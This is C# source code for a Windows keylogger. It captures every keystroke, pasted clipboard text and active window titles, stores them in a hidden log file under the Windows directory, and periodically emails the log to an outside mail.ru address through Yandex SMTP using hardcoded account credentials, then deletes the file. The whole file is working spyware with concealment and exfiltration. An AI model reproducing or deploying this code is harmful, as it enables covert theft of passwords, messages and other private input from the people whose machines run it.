using System;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Text;
using static WindowsFormsApp1.WinApis.User32;
using System.Net.Mail;
using System.Net;

namespace WindowsFormsApp1
{
    static class Program
    {
        private const string _fileName = "c:\\Windows\\addins\\keyboard.log";
        private const short maxChars = 256;
        private static short _operation = 0;
        private const short numberOfOperation = 200;

        internal static void MailMessage()
        {
            MailAddress from = new MailAddress("MyTestKeyLogger@yandex.ru", "Test");
            MailAddress to = new MailAddress("keyboardget@mail.ru");
            MailMessage m = new MailMessage(from, to);
            m.Subject = "Тест";
            m.Attachments.Add(new Attachment(_fileName));
            m.IsBodyHtml = true;
            SmtpClient smtp = new SmtpClient("smtp.yandex.ru", 587);
            smtp.Credentials = new NetworkCredential("MyTestKeyLogger@yandex.ru", "perRaPaET22");
            smtp.EnableSsl = true;
            smtp.Send(m);
            m.Attachments.Dispose();
        }

        private static string GetActiveWindowTitle()
        {
            var buff = new StringBuilder(maxChars);
            var handle = GetForegroundWindow();

            if (GetWindowText(handle, buff, maxChars) > 0)
            {
                return buff.ToString();
            }
            return null;
        }

        [STAThread]
        static void Main(String[] args)
        {
            String buf = "";
            String windowsTitle = "";
            bool shift = false;
            windowsTitle = GetActiveWindowTitle();
            while (true)
            {
                Thread.Sleep(200);
                if (windowsTitle != GetActiveWindowTitle() && buf.Length > 0)
                {
                    _operation++;
                    File.AppendAllText(_fileName, buf);
                    File.AppendAllText(_fileName, $"{Environment.NewLine}{windowsTitle}{Environment.NewLine}");
                    File.SetAttributes(_fileName, FileAttributes.Hidden);
                    if (_operation > numberOfOperation)
                    {
                        MailMessage();
                        _operation = 0;
                        File.Delete(_fileName);
                    }
                    windowsTitle = GetActiveWindowTitle();
                    buf = "";
                }
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if ((((Keys)i) == Keys.ControlKey || ((Keys)i) == Keys.LControlKey))
                        {
                            if (GetAsyncKeyState((int)Keys.V) != 0)
                            {
                                buf += $"<{Clipboard.GetText()}>";
                            }
                            break;
                        }
                        if (((Keys)i) == Keys.Back)
                        {
                            if (buf.Length > 1)
                            {
                                int del = 1;
                                if (buf[buf.Length - 1] == '>')
                                {
                                    for (; buf[buf.Length - del] != '<'; del++);
                                }
                               buf = buf.Remove(buf.Length - del, del);
                            }
                            continue;
                        }
                        if (Keys.ShiftKey == ((Keys) i)
                            || Keys.LShiftKey == ((Keys) i)
                            || Keys.RShiftKey == ((Keys) i))
                        {
                            if (shift == false)
                            {
                                shift = true;
                            }
                            else
                            {
                                shift = true;
                            }
                        }
                        var caps = Console.CapsLock;
                        bool isBig = shift | caps;
                        if (((Keys)i) == Keys.Capital) { continue; }
                        if (((Keys)i).ToString().Length == 1)
                        {
                            if (isBig)
                            {
                                buf += ((Keys)i).ToString();
                            }
                            else
                            {
                                buf += ((Keys)i).ToString().ToLowerInvariant();
                            }
                        }
                        else
                        {
                            buf += $"<{((Keys)i).ToString()}>";
                        }
                    }
                }
            }
        }
    }
}
